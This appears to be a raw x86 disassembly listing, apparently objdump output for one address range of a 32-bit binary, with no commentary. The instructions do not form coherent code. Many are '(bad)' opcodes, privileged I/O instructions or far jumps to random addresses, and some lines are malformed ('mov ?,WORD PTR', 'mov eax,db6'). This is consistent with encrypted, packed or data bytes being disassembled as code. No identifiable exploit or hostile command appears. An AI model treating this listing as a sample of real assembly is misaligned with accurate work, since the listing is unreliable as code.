  40a12b:	xor    BYTE PTR [ebx],0x66
  40a12e:	outs   dx,BYTE PTR ds:[esi]
  40a12f:	push   ecx
  40a130:	cdq    
  40a131:	ins    DWORD PTR es:[edi],dx
  40a132:	or     cl,BYTE PTR [ebx+0x78]
  40a135:	pop    edi
  40a136:	jmp    0xe9e6:0x2236d2f3
  40a13d:	push   ebp
  40a13e:	jmp    0x5373:0xa80fa196
  40a145:	cmp    al,0xa8
  40a147:	aas    
  40a148:	(bad)  
  40a149:	mov    esi,DWORD PTR ds:0x2a5b293c
  40a14f:	pop    eax
  40a150:	(bad)  
  40a151:	sbb    edx,DWORD PTR [eax-0x34c8c055]
  40a157:	mov    ?,WORD PTR [ebx]
  40a159:	sbb    al,0x13
  40a15b:	push   cs
  40a15c:	xor    eax,DWORD PTR [ecx]
  40a15e:	(bad)  
  40a15f:	mov    esi,0x5b28672
  40a164:	mov    edx,0x40927f0f
  40a169:	lods   al,BYTE PTR ds:[esi]
  40a16a:	xlat   BYTE PTR ds:[ebx]
  40a16b:	xor    ch,BYTE PTR [edx-0x5]
  40a16e:	add    dl,BYTE PTR [ebx+0x5]
  40a171:	lahf   
  40a172:	add    bl,cl
  40a174:	xor    bl,al
  40a176:	call   FWORD PTR [esi-0x64]
  40a179:	sub    BYTE PTR [ebx],dl
  40a17b:	sbb    bl,cl
  40a17d:	mov    dl,0x22
  40a17f:	jmp    0x40a12b
  40a181:	(bad)  
  40a182:	pop    ebp
  40a183:	mov    eax,ds:0xb90f6385
  40a188:	mov    fs,WORD PTR [esp+ecx*8]
  40a18b:	shl    DWORD PTR [edx+0xf],cl
  40a18e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a18f:	retf   0xa5eb
  40a192:	addr16 cdq 
  40a194:	in     al,0x16
  40a196:	scas   al,BYTE PTR es:[edi]
  40a197:	lods   eax,DWORD PTR ds:[esi]
  40a198:	pop    edi
  40a199:	pusha  
  40a19a:	in     al,0xb1
  40a19c:	mov    esi,0xdcfcdbde
  40a1a1:	addr16 aaa 
  40a1a3:	test   BYTE PTR [edx-0x33],bl
  40a1a6:	jae    0x40a227
  40a1a8:	cdq    
  40a1a9:	test   BYTE PTR [eax+0x2a1c7a09],ch
  40a1af:	pop    esp
  40a1b0:	add    eax,0x31253696
  40a1b5:	mov    edi,0xc8029259
  40a1ba:	pop    eax
  40a1bb:	sti    
  40a1bc:	in     al,0x30
  40a1be:	add    al,0xa7
  40a1c0:	call   0x18dcc57f
  40a1c5:	loopne 0x40a17c
  40a1c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1c8:	jnp    0x40a23a
  40a1ca:	sbb    DWORD PTR [ebp-0x72],edx
  40a1cd:	gs sahf 
  40a1cf:	lahf   
  40a1d0:	(bad)  
  40a1d1:	mov    WORD PTR [eax+0x4f],?
  40a1d4:	scas   eax,DWORD PTR es:[edi]
  40a1d5:	mov    ch,0x61
  40a1d7:	clc    
  40a1d8:	xchg   ecx,eax
  40a1d9:	data16 sub cl,BYTE PTR [esi]
  40a1dc:	scas   eax,DWORD PTR es:[edi]
  40a1dd:	pop    ss
  40a1de:	into   
  40a1df:	mov    ebp,0x3a5ca5db
  40a1e4:	pop    esp
  40a1e5:	or     DWORD PTR [ebx-0x49],esp
  40a1e8:	rcl    ah,cl
  40a1ea:	jle    0x40a1a5
  40a1ec:	cmp    al,0x12
  40a1ee:	sub    DWORD PTR [ebx+0x7b85e9a6],esp
  40a1f4:	add    al,0xcf
  40a1f6:	fidivr WORD PTR [edi]
  40a1f8:	lods   eax,DWORD PTR ds:[esi]
  40a1f9:	jbe    0x40a21d
  40a1fb:	shr    DWORD PTR ds:0xae2a8143,cl
  40a201:	xchg   DWORD PTR [ecx],esi
  40a203:	loope  0x40a1d6
  40a205:	push   esi
  40a206:	dec    ecx
  40a207:	mov    cl,ch
  40a209:	xchg   ecx,eax
  40a20a:	rcl    al,0x2a
  40a20d:	cmp    edi,eax
  40a20f:	cld    
  40a210:	leave  
  40a211:	mov    WORD PTR [edi],ds
  40a213:	fld    QWORD PTR [eax-0x412800c7]
  40a219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a21a:	dec    ebx
  40a21b:	mov    BYTE PTR [ebx-0x7],0x56
  40a21f:	dec    ebx
  40a220:	iret   
  40a221:	mov    ds:0x93771bde,eax
  40a226:	push   0x94879093
  40a22b:	xchg   ecx,eax
  40a22c:	xor    DWORD PTR [ebp-0x65],ecx
  40a22f:	mov    BYTE PTR [ecx+0x1cb713ad],dh
  40a235:	fbld   TBYTE PTR [esi-0x3c]
  40a238:	ret    
  40a239:	push   ebp
  40a23a:	stos   DWORD PTR es:[edi],eax
  40a23b:	cmp    eax,0x6e75122c
  40a240:	ja     0x40a1c3
  40a242:	out    0x1,al
  40a244:	push   edi
  40a245:	popf   
  40a246:	aam    0x9d
  40a248:	sub    ch,al
  40a24a:	jmp    0x8980:0xc0431897
  40a251:	pushf  
  40a252:	test   edx,ecx
  40a254:	adc    edx,DWORD PTR [edi]
  40a256:	repnz pop edi
  40a258:	jo     0x40a1eb
  40a25a:	push   edx
  40a25b:	ret    
  40a25c:	push   eax
  40a25d:	add    ebx,esp
  40a25f:	jg     0x40a21c
  40a261:	or     eax,0x5b20cf33
  40a266:	rcr    ah,0x13
  40a269:	fistp  DWORD PTR [eax]
  40a26b:	(bad)  [ebx-0x63]
  40a26e:	add    al,0xaa
  40a270:	ret    0xe08f
  40a273:	(bad)  
  40a274:	jp     0x40a250
  40a276:	(bad)  
  40a277:	fsubrp st(4),st
  40a279:	xchg   edx,eax
  40a27a:	push   eax
  40a27b:	fidiv  DWORD PTR [eax+0x1f]
  40a27e:	(bad)  
  40a27f:	(bad)  
  40a280:	xchg   esp,eax
  40a281:	xor    eax,DWORD PTR [eax-0x17]
  40a284:	sbb    ebx,ecx
  40a286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a287:	pop    ss
  40a288:	inc    esp
  40a289:	mov    ecx,0xe81058c8
  40a28e:	dec    ebx
  40a28f:	test   al,0x0
  40a291:	ds push 0x1930f866
  40a297:	in     al,dx
  40a298:	add    cl,BYTE PTR [edi+ebx*1]
  40a29b:	mov    edi,0x77b04c83
  40a2a0:	rcr    dl,cl
  40a2a2:	js     0x40a25d
  40a2a4:	loop   0x40a26e
  40a2a6:	dec    ebx
  40a2a7:	mov    ds:0x94046bc,al
  40a2ac:	add    ebx,ebx
  40a2ae:	out    dx,al
  40a2af:	popf   
  40a2b0:	cmp    ch,al
  40a2b2:	test   DWORD PTR [eax],ebx
  40a2b4:	sbb    al,0x77
  40a2b6:	les    edx,FWORD PTR [esi-0xe]
  40a2b9:	jno    0x40a2e7
  40a2bb:	add    DWORD PTR [edx],ebx
  40a2bd:	cdq    
  40a2be:	retf   0xec1b
  40a2c1:	or     BYTE PTR [edx],al
  40a2c3:	(bad)  
  40a2c4:	push   ss
  40a2c5:	scas   eax,DWORD PTR es:[edi]
  40a2c6:	xchg   esp,eax
  40a2c7:	add    al,0xde
  40a2c9:	mov    ds:0xbbff4eff,eax
  40a2ce:	fs cmp DWORD PTR ss:[edi-0x1cd45e05],esi
  40a2d6:	test   eax,0xdb89d44e
  40a2db:	mov    BYTE PTR [edx],bh
  40a2dd:	aam    0xdc
  40a2df:	mov    ds:0xacaa427b,al
  40a2e4:	ret    
  40a2e5:	in     al,dx
  40a2e6:	adc    al,0xcc
  40a2e8:	icebp  
  40a2e9:	xchg   ebp,eax
  40a2ea:	or     bl,dh
  40a2ec:	pusha  
  40a2ed:	aaa    
  40a2ee:	icebp  
  40a2ef:	pop    edx
  40a2f0:	repz imul esp,esi,0x660734d3
  40a2f7:	out    0x32,eax
  40a2f9:	(bad)  
  40a2fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2fb:	cmp    eax,0x56b79d24
  40a300:	lahf   
  40a301:	push   ebx
  40a302:	test   eax,0x361c63c8
  40a307:	and    bh,BYTE PTR [esi+0x2ff04975]
  40a30d:	sahf   
  40a30e:	mov    edi,0xc06da262
  40a313:	test   BYTE PTR [edx],dl
  40a315:	std    
  40a316:	xor    BYTE PTR [edi],0x47
  40a319:	mov    ecx,0xfebc7b1
  40a31e:	pop    ss
  40a31f:	add    dl,BYTE PTR [edx-0x5f2e4c7]
  40a325:	mov    ah,0xff
  40a327:	popa   
  40a328:	(bad)  
  40a329:	push   ebp
  40a32a:	xchg   ebx,eax
  40a32b:	add    dh,BYTE PTR [eax]
  40a32d:	sahf   
  40a32e:	(bad)  
  40a32f:	bound  ebx,QWORD PTR [esi+0x1183786]
  40a335:	outs   dx,DWORD PTR ds:[esi]
  40a336:	or     dl,0xb8
  40a339:	mov    edx,esp
  40a33b:	call   0x4e42:0xb3ff9ed2
  40a342:	adc    esp,DWORD PTR [ebx+0x4ab73faa]
  40a348:	and    edi,DWORD PTR [edi-0x6a1af0]
  40a34e:	pop    eax
  40a34f:	jge    0x40a3c5
  40a351:	jmp    0xbe32:0x18479497
  40a358:	ins    BYTE PTR es:[edi],dx
  40a359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a35a:	out    dx,eax
  40a35b:	addr16 jmp 0x8132ea68
  40a361:	xchg   edx,eax
  40a362:	dec    ebx
  40a363:	rcr    DWORD PTR [esi+0x59],1
  40a366:	mov    eax,db6
  40a369:	push   es
  40a36a:	mov    al,ds:0x57793335
  40a36f:	or     dl,BYTE PTR [ecx+0x294d6fc0]
  40a375:	or     bl,cl
  40a377:	pop    esp
  40a378:	fdiv   DWORD PTR [ebp+0x67]
  40a37b:	stos   DWORD PTR es:[edi],eax
  40a37c:	jno    0x40a354
  40a37e:	fisubr WORD PTR [ebx]
  40a380:	mov    es,WORD PTR [eax+0x3db1904]
  40a386:	lahf   
  40a387:	push   esi
  40a388:	cmc    
  40a389:	add    al,0x6e
  40a38b:	push   ecx
  40a38c:	xor    BYTE PTR [edi+ecx*1],dh
  40a38f:	or     BYTE PTR [esi-0x7d],cl
  40a392:	pop    es
  40a393:	inc    ecx
  40a394:	test   al,0x23
  40a396:	xchg   BYTE PTR [edx],al
  40a398:	jp     0x40a358
  40a39a:	dec    ecx
  40a39b:	sti    
  40a39c:	inc    ebp
  40a39d:	xchg   ebx,eax
  40a39e:	and    dx,bx
  40a3a1:	xor    BYTE PTR [edi+0x5c],al
  40a3a4:	push   ds
  40a3a5:	cmp    edx,DWORD PTR [edi-0x61]
  40a3a8:	bound  ecx,QWORD PTR [eax+0x592b42a9]
  40a3ae:	or     al,0xad
  40a3b1:	xchg   DWORD PTR [ebx+0x491be566],esi
  40a3b7:	push   0x3dd824ee
  40a3bc:	or     DWORD PTR ss:[ebx],0x131b678f
  40a3c3:	sti    
  40a3c4:	(bad)  
  40a3c5:	sti    
  40a3c6:	sbb    edi,DWORD PTR [ebx+esi*8]
  40a3c9:	mov    dh,0xca
  40a3cb:	loopne 0x40a3b9
  40a3cd:	cwde   
  40a3ce:	xchg   BYTE PTR [ebp+esi*2+0x2da16c6d],dh
  40a3d5:	ja     0x40a396
  40a3d7:	jae    0x40a40f
  40a3d9:	jnp    0x40a3b3
  40a3db:	xlat   BYTE PTR ds:[ebx]
  40a3dc:	arpl   bx,bp
  40a3de:	xchg   esp,eax
  40a3df:	push   cs
  40a3e0:	(bad)  
  40a3e1:	nop
  40a3e2:	out    0x55,eax
  40a3e4:	pusha  
  40a3e5:	push   eax
  40a3e6:	aad    0xe
  40a3e8:	lods   al,BYTE PTR ds:[esi]
  40a3e9:	outs   dx,BYTE PTR ds:[esi]
  40a3ea:	sahf   
  40a3eb:	pop    ss
  40a3ec:	retf   
  40a3ed:	jg     0x40a446
  40a3ef:	daa    
  40a3f0:	out    0x45,al
  40a3f2:	mov    ds:0x64ef989b,al
  40a3f7:	adc    dh,BYTE PTR [ecx+0x49]
  40a3fa:	xor    BYTE PTR [esi],al
  40a3fc:	sub    ebx,ecx
  40a3fe:	fstp   DWORD PTR [eax-0x44]
  40a401:	test   al,0x53
  40a403:	rcr    BYTE PTR [esi+0x7],1
  40a406:	retf   0xd345
  40a409:	dec    esp
  40a40a:	adc    bl,BYTE PTR [ecx]
  40a40c:	mov    ecx,0x3ea98067
  40a411:	xchg   BYTE PTR [edx-0x7a032b4a],ah
  40a417:	xchg   esp,eax
  40a418:	lea    ecx,[eax]
  40a41a:	ss int 0x73
  40a41d:	rcr    BYTE PTR [edx],1
  40a41f:	mov    ah,0xf2
  40a421:	aam    0xb
  40a423:	neg    esp
  40a425:	xchg   ecx,eax
  40a426:	pop    ebp
  40a427:	pop    edi
  40a428:	mov    ecx,0x744901
  40a42d:	pushf  
  40a42e:	stos   BYTE PTR es:[edi],al
  40a42f:	sub    esi,DWORD PTR [edx]
  40a431:	test   al,0xa6
  40a433:	push   edx
  40a434:	add    esi,esi
  40a436:	(bad)  
  40a437:	shr    bh,cl
  40a439:	inc    ebp
  40a43a:	scas   eax,DWORD PTR es:[edi]
  40a43b:	arpl   WORD PTR [edx],sp
  40a43d:	and    DWORD PTR [esi+0x7896819],esi
  40a443:	div    BYTE PTR [eax+0x54da4bbf]
  40a449:	inc    ebx
  40a44a:	sbb    BYTE PTR [ecx],0x2e
  40a44d:	pusha  
  40a44e:	or     al,BYTE PTR [edx+0x782100ea]
  40a454:	sbb    ebp,DWORD PTR [edx]
  40a456:	ins    BYTE PTR es:[edi],dx
  40a457:	out    dx,al
  40a458:	mov    dh,BYTE PTR [bp+0xd31]
  40a45d:	clc    
  40a45e:	lock sub DWORD PTR [eax-0x50],0x6e1a4003
  40a466:	xchg   BYTE PTR cs:[esi-0xa6ac280],cl
  40a46d:	pop    es
  40a46e:	cmp    cl,BYTE PTR [ecx-0x29283e5e]
  40a474:	jnp    0x40a4cd
  40a476:	xor    cl,BYTE PTR [ecx+0x311187a2]
  40a47c:	jl     0x40a4cb
  40a47e:	call   0x3345:0xed89b889
  40a485:	int3   
  40a486:	push   0x68
  40a488:	push   0x14
  40a48a:	and    BYTE PTR [ecx+0x7f],bh
  40a48d:	aaa    
  40a48e:	int    0x95
  40a490:	add    esp,eax
  40a492:	retf   
  40a493:	add    edx,DWORD PTR ds:0xc6ac884d
  40a499:	hlt    
  40a49a:	ret    0xa10a
  40a49d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a49e:	sub    edx,DWORD PTR [edi+0x323af5a9]
  40a4a4:	sbb    eax,DWORD PTR [ebx+edi*1-0x2e]
  40a4a8:	stos   DWORD PTR es:[edi],eax
  40a4a9:	pop    edx
  40a4aa:	enter  0x4b2d,0xd1
  40a4ae:	fild   DWORD PTR [ecx]
  40a4b0:	add    BYTE PTR [edi+0x76037a73],dl
  40a4b6:	les    ecx,FWORD PTR [edx]
  40a4b8:	call   0x4be9:0x3138375
  40a4bf:	repz mov cs,WORD PTR [edx+0x3a]
  40a4c3:	adc    DWORD PTR [edx-0x17ce0449],edx
  40a4c9:	fnstsw WORD PTR [ebx]
  40a4cb:	(bad)
  40a4cf:	add    al,0xff
  40a4d1:	out    0x39,al
  40a4d3:	(bad)  
  40a4d4:	xchg   ebp,eax
  40a4d5:	bswap  ebx
  40a4d7:	xchg   edx,eax
  40a4d8:	iret   
  40a4d9:	dec    esi
  40a4da:	fisttp WORD PTR [ebx-0x1e]
  40a4dd:	adc    DWORD PTR [eax+0x339f6797],esp
  40a4e3:	dec    ebx
  40a4e4:	adc    eax,0x602f998
  40a4e9:	rcr    DWORD PTR [edx+0x2a4021d3],1
  40a4ef:	int3   
  40a4f0:	or     esp,DWORD PTR [ebx+0x2b]
  40a4f3:	add    al,0x9e
  40a4f5:	(bad)  
  40a4f6:	ja     0x40a4b1
  40a4f8:	xor    DWORD PTR [edx],eax
  40a4fa:	mov    al,0x3f
  40a4fc:	inc    ecx
  40a4fd:	inc    eax
  40a4fe:	stos   BYTE PTR es:[edi],al
  40a4ff:	cmp    BYTE PTR [esi-0x34c0d0be],0x47
  40a506:	(bad)  [eax-0x180be8e]
  40a50c:	sbb    DWORD PTR [ecx],ebx
  40a50e:	loop   0x40a4d2
  40a510:	jle    0x40a57f
  40a512:	or     al,0x43
  40a514:	xchg   esi,eax
  40a515:	mov    BYTE PTR [ebx],bh
  40a517:	mov    esp,0xa9a995d3
  40a51c:	xor    eax,0x47fab357
  40a521:	xchg   edx,eax
  40a522:	sti    
  40a523:	pop    ds
  40a524:	push   edx
  40a525:	ja     0x40a591
  40a527:	xchg   ebp,eax
  40a528:	mov    esi,0xea522e18
  40a52d:	or     al,0xe2
  40a52f:	enter  0x2fc2,0xfc
  40a533:	push   eax
  40a534:	push   ss
  40a535:	inc    ebx
  40a536:	sub    esi,DWORD PTR [eax+0x6a1bd4cf]
  40a53c:	test   eax,0xc9a73b03
  40a541:	jae    0x40a4e7
  40a543:	sbb    ebx,ebx
  40a545:	dec    esp
  40a546:	cmp    al,ch
  40a548:	mov    bh,BYTE PTR [edx-0x75ce4d46]
  40a54e:	out    0xbe,al
  40a550:	pop    ecx
  40a551:	add    al,BYTE PTR [edx]
  40a553:	(bad)  ds:0x659a039e
  40a559:	loop   0x40a5cb
  40a55b:	adc    ebp,DWORD PTR [esi-0x2a]
  40a55e:	inc    ebx
  40a55f:	cdq    
  40a560:	jae    0x40a532
  40a562:	imul   esp,DWORD PTR fs:[ecx],0xffffffed
  40a566:	ret    
  40a567:	lea    edx,es:[edi+0x1d]
  40a56b:	(bad)  
  40a56c:	fistp  QWORD PTR [edx]
  40a56e:	xor    BYTE PTR [ebx+eax*1],al
  40a571:	dec    ebp
  40a572:	sbb    al,0xed
  40a574:	sbb    esp,DWORD PTR [ecx-0x346bdca]
  40a57a:	and    BYTE PTR [eax],ch
  40a57c:	mov    ch,0xe5
  40a57e:	das    
  40a57f:	lods   eax,DWORD PTR ds:[esi]
  40a580:	jno    0x40a55b
  40a582:	xor    esi,DWORD PTR [edx+0x7]
  40a585:	xor    BYTE PTR [esi+0x297bf922],bh
  40a58b:	or     eax,0xbd469282
  40a590:	nop
  40a591:	gs test al,0xa
  40a594:	dec    ebx
  40a595:	dec    edx
  40a596:	jmp    0x2fc6:0x4fea283
  40a59d:	(bad)  
  40a59e:	out    0x2d,eax
  40a5a0:	aad    0x42
  40a5a2:	and    eax,edi
  40a5a4:	fstp   DWORD PTR [edx*1-0x587eff7]
  40a5ab:	pop    ss
  40a5ac:	push   es
  40a5ad:	aaa    
  40a5ae:	mov    bh,0x2
  40a5b0:	pop    esp
  40a5b1:	cmp    dl,BYTE PTR [ecx-0x4db7e515]
  40a5b7:	stc    
  40a5b8:	jp     0x40a5d4
  40a5ba:	dec    ebx
  40a5bb:	cmp    ch,BYTE PTR [ebp-0x4d]
  40a5be:	data16 or dl,dl
  40a5c1:	sbb    DWORD PTR [ebx],edx
  40a5c3:	sti    
  40a5c4:	outs   dx,DWORD PTR ds:[esi]
  40a5c5:	or     BYTE PTR [edi-0x7a],al
  40a5c8:	inc    esi
  40a5c9:	lods   al,BYTE PTR ds:[esi]
  40a5ca:	jmp    0xabe9:0xce8e9a32
  40a5d1:	lea    esi,[eax+0x65]
  40a5d4:	cmp    al,BYTE PTR [ecx+0x361a567a]
  40a5da:	fs leave 
  40a5dc:	fbld   TBYTE PTR [esp+ebx*8-0x66]
  40a5e0:	rcl    DWORD PTR [esi+0x6f],1
  40a5e3:	pop    esi
  40a5e4:	repz adc eax,0x27085e01
  40a5ea:	repz repnz mov edx,0xf698c662
  40a5f1:	jno    0x40a632
  40a5f3:	fistp  WORD PTR [edx]
  40a5f5:	adc    BYTE PTR [edx],dh
  40a5f7:	fcmovnu st,st(5)
  40a5f9:	popf   
  40a5fa:	mov    ds:0xe6bca879,eax
  40a5ff:	mov    ecx,0xb6a88cc1
  40a604:	add    esi,DWORD PTR [eax-0x1d03baae]
  40a60a:	sbb    edi,esp
  40a60c:	push   esp
  40a60d:	lods   al,BYTE PTR ds:[esi]
  40a60e:	add    esi,edi
  40a610:	imul   BYTE PTR [esi+0x4c6e617e]
  40a616:	mov    ch,0xe5
  40a618:	repnz lea esi,ds:0x5a9939e1
  40a61f:	mov    edi,0xbab70e43
  40a624:	cmp    ecx,ebp
  40a626:	in     al,0x56
  40a628:	cmp    BYTE PTR [esi-0x643c8488],dh
  40a62e:	int3   
  40a62f:	call   0x36596c2d
  40a634:	push   ecx
  40a635:	in     eax,0xc1
  40a637:	fisttp QWORD PTR [esi+0x3b]
  40a63a:	mov    DWORD PTR [eax+eiz*1-0x9],ecx
  40a63e:	sub    edx,edi
  40a640:	mov    BYTE PTR [edi+0x34a7d9c9],0xdf
  40a647:	jmp    0xfd90f445
  40a64c:	inc    ebp
  40a64d:	stc    
  40a64e:	shr    BYTE PTR [esi+0x3e],cl
  40a651:	xchg   ebx,eax
  40a652:	mov    al,ds:0x7b11e5c8
  40a657:	outs   dx,BYTE PTR ds:[esi]
  40a658:	jg     0x40a618
  40a65a:	loop   0x40a5df
  40a65c:	shl    DWORD PTR [ebx-0x12],cl
  40a65f:	jno    0x40a672
  40a661:	lods   eax,DWORD PTR ds:[esi]
  40a662:	sbb    eax,0xe6b227cd
  40a667:	mov    edi,0xa72908e1
  40a66c:	and    DWORD PTR [ecx],edi
  40a66e:	(bad)  
  40a66f:	mov    al,ds:0x94d1a48b
  40a674:	ret    0x1d00
  40a677:	xor    edi,DWORD PTR [eax]
  40a679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a67a:	mov    ebx,0xcdb1af51
  40a67f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a680:	adc    ecx,edx
  40a682:	sub    ecx,ebp
  40a684:	pop    ebp
  40a685:	cmp    eax,0xdd9f8476
  40a68a:	mov    edx,ebp
  40a68c:	cmp    al,0x14
  40a68e:	jb     0x40a67b
  40a690:	adc    esp,DWORD PTR [ecx+0x75e40520]
  40a696:	pop    eax
  40a697:	aas    
  40a698:	leave  
  40a699:	(bad)  
  40a69a:	in     al,0xdb
  40a69c:	and    DWORD PTR [ebp-0x65],edi
  40a69f:	outs   dx,BYTE PTR ds:[esi]
  40a6a0:	push   ds
  40a6a1:	mov    ebp,0x1c71307e
  40a6a6:	push   0x59
  40a6a8:	pop    edx
  40a6a9:	mov    es,WORD PTR [esi]
  40a6ab:	or     al,0x94
  40a6ad:	sti    
  40a6ae:	loop   0x40a716
  40a6b0:	repnz push esi
  40a6b2:	inc    edx
  40a6b3:	inc    BYTE PTR [esi+0x73]
  40a6b6:	push   edx
  40a6b7:	popa   
  40a6b8:	mul    BYTE PTR [ebx]
  40a6ba:	jle    0x40a6d9
  40a6bc:	and    eax,0x7a463253
  40a6c1:	popa   
  40a6c2:	in     al,0x5b
  40a6c4:	xor    eax,0xb6024845
  40a6c9:	adc    eax,0x11243a37
  40a6ce:	fadd   DWORD PTR [edi+0x34]
  40a6d1:	aam    0x46
  40a6d3:	jmp    0x40a698
  40a6d5:	xor    BYTE PTR [ebx],cl
  40a6d7:	sbb    BYTE PTR [esi-0x18a3ec74],bl
  40a6dd:	xchg   DWORD PTR [ebx-0x32],eax
  40a6e0:	outs   dx,DWORD PTR ds:[esi]
  40a6e1:	inc    edi
  40a6e2:	stos   DWORD PTR es:[edi],eax
  40a6e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6e4:	sub    ch,cl
  40a6e6:	clc    
  40a6e7:	jge    0x40a677
  40a6e9:	xchg   BYTE PTR [eax],bh
  40a6eb:	mov    esi,0xc6478a27
  40a6f0:	pop    edx
  40a6f1:	mov    esp,0x165eec98
  40a6f6:	jmp    0xd8b5e398
  40a6fb:	inc    BYTE PTR [edx]
  40a6fd:	xor    DWORD PTR [esi-0x5739e9b5],esp
  40a703:	jb     0x40a6c8
  40a705:	adc    ebp,eax
  40a707:	mov    esp,0x66ff146
  40a70c:	lds    edx,FWORD PTR [edi-0x72509f7]
  40a712:	and    DWORD PTR [ecx+0x7e],edi
  40a715:	add    BYTE PTR [ecx],ch
  40a717:	out    dx,eax
  40a718:	test   eax,0xf75d9189
  40a71d:	sub    BYTE PTR [eax],cl
  40a71f:	mov    ebp,0x85463074
  40a724:	or     ebx,DWORD PTR [ebx-0x69]
  40a727:	(bad)  
  40a728:	and    DWORD PTR [ecx+0x2b],0xffffff85
  40a72c:	scas   eax,DWORD PTR es:[edi]
  40a72d:	push   ecx
  40a72e:	enter  0x12a4,0x6e
  40a732:	and    BYTE PTR [eax+0x13],dh
  40a735:	dec    eax
  40a736:	cmp    bl,bl
  40a738:	repz push edi
  40a73a:	inc    esi
  40a73b:	cli    
  40a73c:	test   bl,ch
  40a73e:	imul   edx,DWORD PTR [ebp-0x5b00ef65],0xffffff8f
  40a745:	add    dl,ah
  40a747:	mov    bh,0x4e
  40a749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a74a:	push   ds
  40a74b:	pop    edi
  40a74c:	js     0x40a757
  40a74e:	retf   0xea6a
  40a751:	mov    esi,0xe310ebef
  40a756:	(bad)  
  40a757:	pop    edx
  40a758:	mov    dh,0xb2
  40a75a:	popa   
  40a75b:	xchg   ebp,eax
  40a75c:	adc    DWORD PTR [edi],esi
  40a75e:	xchg   ecx,eax
  40a75f:	repz and al,0x0
  40a762:	push   esp
  40a763:	in     eax,dx
  40a764:	jne    0x40a7ae
  40a766:	das    
  40a767:	xchg   ecx,eax
  40a768:	ficomp WORD PTR [edi]
  40a76a:	jecxz  0x40a735
  40a76c:	mov    edx,0xeb76df1f
  40a771:	ins    BYTE PTR es:[edi],dx
  40a772:	daa    
  40a773:	jno    0x40a7d7
  40a775:	aad    0x87
  40a777:	push   ebp
  40a778:	sti    
  40a779:	jecxz  0x40a795
  40a77b:	ret    
  40a77c:	jle    0x40a72d
  40a77e:	sahf   
  40a77f:	fistp  QWORD PTR [esi]
  40a781:	jmp    0x40a739
  40a783:	push   DWORD PTR [edi]
  40a785:	jg     0x40a7e9
  40a787:	mov    ds:0x5908d426,al
  40a78c:	add    edi,DWORD PTR [ecx]
  40a78e:	data16 cmp dl,BYTE PTR [edx-0x3d]
  40a792:	ret    
  40a793:	jmp    0xbfe97303
  40a798:	inc    edx
  40a799:	test   BYTE PTR [esi-0x2f],al
  40a79c:	xchg   edi,eax
  40a79d:	sbb    eax,DWORD PTR [ebx]
  40a79f:	xor    bh,dh
  40a7a1:	mov    al,0x17
  40a7a3:	mov    eax,0xc89fb3d3
  40a7a8:	push   edx
  40a7a9:	or     DWORD PTR [edi+0x4001cf67],0xffffffec
  40a7b0:	popf   
  40a7b1:	inc    ebp
  40a7b2:	xor    bh,BYTE PTR [edx+0x1e]
  40a7b5:	outs   dx,DWORD PTR ds:[esi]
  40a7b6:	(bad)  
  40a7b7:	popa   
  40a7b8:	out    dx,al
  40a7b9:	lock jno 0x40a75c
  40a7bc:	sbb    dh,ah
  40a7be:	pop    ebp
  40a7bf:	cmp    al,0x6
  40a7c1:	out    0x43,al
  40a7c3:	call   0x719d:0xd032f209
  40a7ca:	icebp  
  40a7cb:	sbb    eax,0x1ec816d5
  40a7d0:	imul   ebp,DWORD PTR [ebx+0x5cb7a22d],0x59cd1c5d
  40a7da:	or     dl,cl
  40a7dc:	add    BYTE PTR [eax+0x4f],al
  40a7df:	jecxz  0x40a81f
  40a7e1:	sbb    eax,0xcfdea4dc
  40a7e6:	repnz mov eax,0x2aa6ef92
  40a7ec:	call   0xf4d4:0x66d1f9bb
  40a7f3:	add    al,0xf4
  40a7f5:	rcl    ebx,0x4c
  40a7f8:	push   0xffffffe5
  40a7fa:	xor    ah,dh
  40a7fc:	and    BYTE PTR [eax-0x72616829],bh
  40a802:	pusha  
  40a803:	cdq    
  40a804:	jae    0x40a826
  40a806:	retf   0x649
  40a809:	mov    ds:0xd3b0434d,eax
  40a80e:	jmp    0xb412:0xa096ec27
  40a815:	ja     0x40a7d4
  40a817:	bound  edx,QWORD PTR [edx]
  40a819:	inc    eax
  40a81a:	enter  0x5fa9,0x3
  40a81e:	fisubr DWORD PTR es:[ebx+0xd50c581]
  40a825:	xchg   ebp,eax
  40a826:	or     bh,dl
  40a828:	pop    ebx
  40a829:	add    al,0xb3
  40a82b:	adc    eax,0x7aa5fb00
  40a830:	or     BYTE PTR [edi+ebx*8],bl
  40a833:	shl    BYTE PTR [ebp+0x79],1
  40a836:	(bad)  
  40a837:	in     eax,dx
  40a838:	xchg   edx,eax
  40a839:	push   edx
  40a83a:	jg     0x40a89a
  40a83c:	xlat   BYTE PTR ds:[ebx]
  40a83d:	pop    ds
  40a83e:	add    ch,dh
  40a840:	lods   al,BYTE PTR ds:[esi]
  40a841:	in     eax,dx
  40a842:	fwait
  40a843:	push   ebp
  40a844:	jl     0x40a7dc
  40a846:	clc    
  40a847:	shr    DWORD PTR [esi],0x35
  40a84a:	or     dh,bh
  40a84c:	mov    bh,dl
  40a84e:	(bad)  
  40a84f:	nop
  40a850:	sahf   
  40a851:	aas    
  40a852:	pop    ds
  40a853:	aam    0x46
  40a855:	mov    cs:0xd5c31199,al
  40a85b:	push   ecx
  40a85c:	lods   eax,DWORD PTR ds:[esi]
  40a85d:	pop    ss
  40a85e:	mov    dh,0xe7
  40a860:	mov    eax,ds:0x37b88a92
  40a865:	aas    
  40a866:	pop    edi
  40a867:	lahf   
  40a868:	(bad)  
  40a869:	hlt    
  40a86a:	dec    ecx
  40a86b:	(bad)  
  40a86c:	js     0x40a8b3
  40a86e:	stos   BYTE PTR es:[edi],al
  40a86f:	or     bh,ah
  40a871:	mov    esp,0x8b13670a
  40a877:	outs   dx,BYTE PTR ds:[esi]
  40a878:	sbb    BYTE PTR [eax-0x8],dl
  40a87b:	cmp    BYTE PTR [ecx+0x171d1418],ch
  40a881:	(bad)  
